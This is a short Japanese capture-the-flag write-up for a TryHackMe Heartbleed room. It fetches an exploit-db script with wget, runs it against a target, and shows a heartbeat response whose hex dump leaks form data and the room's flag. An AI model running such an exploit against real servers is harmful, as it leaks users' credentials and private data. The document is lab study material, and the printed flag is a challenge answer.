# HeartBleed writeup
https://tryhackme.com/room/heartbleed

exploit-dbからHeartBleedの情報を拾う。
```shell
[root@kali]# wget https://www.exploit-db.com/raw/32745
[root@kali]# chmod 700 32745
```

改行コードがCRLFなので、LFに置換する。  
`vi`で開いて、`:se ff=unix`して保存。

```shell
[root@kali]# ./32745 <IP> <Port>
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 951
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 67 74 68 3A  ....#.......gth:
  00e0: 20 37 35 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70   75..Content-Typ
  00f0: 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78  e: application/x
  0100: 2D 77 77 77 2D 66 6F 72 6D 2D 75 72 6C 65 6E 63  -www-form-urlenc
  0110: 6F 64 65 64 0D 0A 0D 0A 75 73 65 72 5F 6E 61 6D  oded....user_nam
  0120: 65 3D 68 61 63 6B 65 72 31 30 31 26 75 73 65 72  e=hacker101&user
  0130: 5F 65 6D 61 69 6C 3D 68 61 78 6F 72 40 68 61 78  _email=haxor@hax
  0140: 6F 72 2E 63 6F 6D 26 75 73 65 72 5F 6D 65 73 73  or.com&user_mess
  0150: 61 67 65 3D 54 48 4D 7B 73 53 6C 2D 49 73 2D 42  age=THM{sSl-Is-B
  0160: 61 44 7D 19 33 42 BB BE 13 8D 77 82 D7 AB 44 75  aD}.3B....w...Du
  0170: 40 8C BA 31 00 15 00 88 00 00 00 00 00 00 00 00  @..1............
```
